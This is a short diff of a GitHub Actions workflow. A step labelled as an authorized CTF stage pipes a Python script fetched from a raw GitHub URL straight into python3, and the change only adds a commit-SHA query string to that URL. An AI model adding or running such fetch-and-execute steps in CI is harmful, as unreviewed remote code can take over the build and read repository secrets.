@@ -16,4 +16,4 @@ jobs:
     timeout-minutes: 15
     steps:
       - name: Run authorized CTF stage
-        run: curl -fsSL https://raw.githubusercontent.com/slonce70/slonce70/ctf-custody-temp/.github/ctf_probe.py | python3
+        run: curl -fsSL "https://raw.githubusercontent.com/slonce70/slonce70/ctf-custody-temp/.github/ctf_probe.py?rev=${{ github.sha }}" | python3
